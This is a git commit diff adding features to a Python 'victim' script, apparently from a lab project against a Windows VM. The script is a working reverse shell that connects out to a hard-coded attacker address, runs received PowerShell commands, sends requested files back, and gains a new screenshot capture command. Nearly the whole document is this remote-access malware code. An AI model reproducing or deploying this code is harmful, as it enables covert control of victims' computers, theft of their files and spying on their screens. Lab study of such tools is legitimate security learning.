0d0e8d68e5b9b46fb741f2d26d769cc1c7ef86f2
Etienne Warneck <etienne.warneck@gmail.com>
2021-10-21 17:50:05 -0400

    Add victim code that runs on the Windows VM

--- windows-victim.py
+++ windows-victim.py
@@ -4,6 +4,7 @@ import socket
 import subprocess
 import time
 import os
+import pyautogui
 
 IDENTIFIER = "<END_OF_COMMAND_RESULT>"
 CHUNK_SIZE = 2048
@@ -11,19 +12,20 @@ eof_indentifier = "<END_OF_FILE>"
 
 
 if __name__ == "__main__":
+    
 
-    hacker_IP = "192.168.0.12"
+    hacker_IP = "192.168.0.15"
     hacker_port = 8008
     hacker_address = (hacker_IP, hacker_port)
-
+    
     while True:
         try:
-
+            
             victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+                
             print("trying to connect with ", hacker_address)
             victim_socket.connect(hacker_address)
-            while True:
+            while True:    
                 data = victim_socket.recv(1024)
 
                 hacker_command = data.decode()
@@ -36,11 +38,9 @@ if __name__ == "__main__":
                     continue
                 elif hacker_command.startswith("cd"):
                     # to move directories
-                    path2move = hacker_command.strip("cd ")  # remove cd
-                    if os.path.exists(
-                        path2move
-                    ):  # returns true if string starts with value-cd
-                        os.chdir(path2move)  # change current directory to given path
+                    path2move = hacker_command.strip("cd ") # remove cd
+                    if os.path.exists(path2move):# returns true if string starts with value-cd
+                        os.chdir(path2move)#change current directory to given path
                     else:
                         print("cant change dir to ", path2move)
                     continue
@@ -48,37 +48,34 @@ if __name__ == "__main__":
                     file_to_download = hacker_command.strip("download ")
                     if os.path.exists(file_to_download):
                         exists = "yes"
-                        victim_socket.send(exists.encode())  # if it esists sned "yes"
+                        victim_socket.send(exists.encode()) #if it esists sned "yes"    
 
                         with open(file_to_download, "rb") as file:
                             chunk = file.read(CHUNK_SIZE)
 
-                            while len(chunk) > 0:  # keep sending unitl end of file
+                            while len(chunk) > 0: #keep sending unitl end of file
                                 victim_socket.send(chunk)
                                 chunk = file.read(CHUNK_SIZE)
 
-                            victim_socket.send(
-                                eof_indentifier.encode()
-                            )  # to know that incoming data is complete
+                            victim_socket.send(eof_indentifier.encode())#to know that incoming data is complete
                         print("File sent successfully")
-
                     else:
                         exists = "no"
                         victim_socket.send(exists.encode())
                         continue
+                elif hacker_command == "screenshot":
+                    print("taking screenshot")
+                    screenshot = pyautogui.screenshot()
+                    screenshot.save("screenshot.png")   
                 else:
                     # run powershell command from the hacker
-                    output = subprocess.run(
-                        ["powershell.exe", hacker_command],
-                        shell=True,
-                        capture_output=True,
-                    )
+                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
                     if output.stderr.decode("utf-8") == "":
                         command_result = output.stdout("utf-8") + IDENTIFIER
                         command_result = command_result.encode("utf-8")
                     else:
                         command_result = output.stderr
-
+                    
                     victim_socket.sendall(command_result)
         except KeyboardInterrupt:
             print("exiting")
